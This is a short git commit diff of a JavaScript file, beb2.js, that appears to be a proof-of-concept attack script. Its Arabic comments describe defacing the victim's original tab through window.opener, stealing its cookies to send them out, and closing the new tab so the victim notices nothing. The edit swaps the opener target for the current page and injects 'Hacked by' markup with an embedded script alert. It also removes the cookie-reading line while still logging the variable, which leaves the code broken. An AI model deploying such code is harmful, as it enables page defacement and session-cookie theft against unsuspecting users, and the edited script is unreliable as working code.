9afc5084a85941cf0ae32c957f765dc7465fdd2f
bebars muhammad <84108423+bebars2@users.noreply.github.com>
2026-02-25 23:29:42 +0300

    Update beb2.js

--- beb2.js
+++ beb2.js
@@ -1,12 +1,12 @@
 // 1. طباعة علامة لارا في كونسول الصفحة الجديدة
 console.log("Lara: Acting from the new tab...");
 
-if (window.opener) {
+
     // 2. تغيير محتوى الصفحة الأصلية (الضحية لا تزال هناك!)
-    window.opener.document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:100px;'>Hacked by <script>alert(300);</script></h1>";
+   document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:100px;'>Hacked by <script>alert(300);</script></h1>";
     
     // 3. سرقة الكوكيز من الصفحة الأصلية وإرسالها
-    const cookies = window.opener.document.cookie;
+ 
     console.log("Lara: Cookies from original page:", cookies);
     
     // 4. إغلاق النافذة الجديدة فوراً لكي لا يشعر المستخدم بشيء
